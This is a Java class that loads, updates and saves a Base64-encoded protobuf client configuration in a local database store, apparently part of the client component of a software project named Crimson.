package com.subterranean_security.crimson.client.store;

import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
import com.subterranean_security.crimson.core.util.B64Util;
import com.subterranean_security.crimson.universal.stores.DatabaseStore;

public final class ConfigStore {
	private ConfigStore() {
	}

	private static ClientConfig ic;

	public static ClientConfig getConfig() {
		return ic;
	}

	public static void loadConfig() {
		try {
			ic = ClientConfig.parseFrom(B64Util.decode(DatabaseStore.getDatabase().getString("ic")));
		} catch (Exception e) {
			System.exit(0);
		}
	}

	public static void updateConfig(ClientConfig.Builder config) {
		ic = ClientConfig.newBuilder(ic).mergeFrom(config.build()).build();
	}

	public static void saveIC() {
		DatabaseStore.getDatabase().store("ic", new String(B64Util.encode(getConfig().toByteArray())));
	}

}
